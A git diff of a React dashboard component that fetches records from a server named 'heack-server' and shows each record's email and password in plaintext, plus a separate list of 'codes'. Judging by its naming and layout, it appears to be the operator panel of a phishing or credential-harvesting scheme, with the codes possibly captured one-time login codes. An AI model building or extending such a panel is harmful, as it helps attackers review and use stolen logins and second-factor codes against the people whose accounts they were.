@@ -2,32 +2,37 @@ import React, { useEffect, useState } from "react";
 
 const Dashboard = () => {
   const [item, setItem] = useState([]);
+  const [result, setResult] = useState([]);
 
   useEffect(() => {
-    fetch("https://erosservive.onrender.com/emails")
+    fetch("https://heack-server.vercel.app/users")
       .then((res) => res.json())
       .then((data) => setItem(data));
   }, [item]);
 
-  const handleDelete = (id) => {
-    fetch("https://erosservive.onrender.com/delete/" + id, {
-      method: "DELETE",
-    })
+  useEffect(() => {
+    fetch("https://heack-server.vercel.app/code")
       .then((res) => res.json())
-      .then((result) => alert("Success Full Remove"));
-  };
+      .then((data) => setResult(data));
+  }, [result]);
 
   return (
     <div>
       <div>
         <div className="container">
+          <h3 className="text-center">
+            {result.map((data, index) => (
+              <h3>
+                {index + 1}={data.Code}
+              </h3>
+            ))}
+          </h3>
           <table class="table table-dark">
             <thead>
               <tr>
                 <th scope="col">No</th>
                 <th scope="col">Email</th>
                 <th scope="col">Password</th>
-                <th scope="col">Remove</th>
               </tr>
             </thead>
             <tbody>
@@ -36,12 +41,6 @@ const Dashboard = () => {
                   <td>{index + 1}</td>
                   <td>{data.Email}</td>
                   <td>{data.Password}</td>
-                  <td
-                    className="btn btn-success"
-                    onClick={() => handleDelete(data._id)}
-                  >
-                    Delate
-                  </td>
                 </tr>
               ))}
             </tbody>
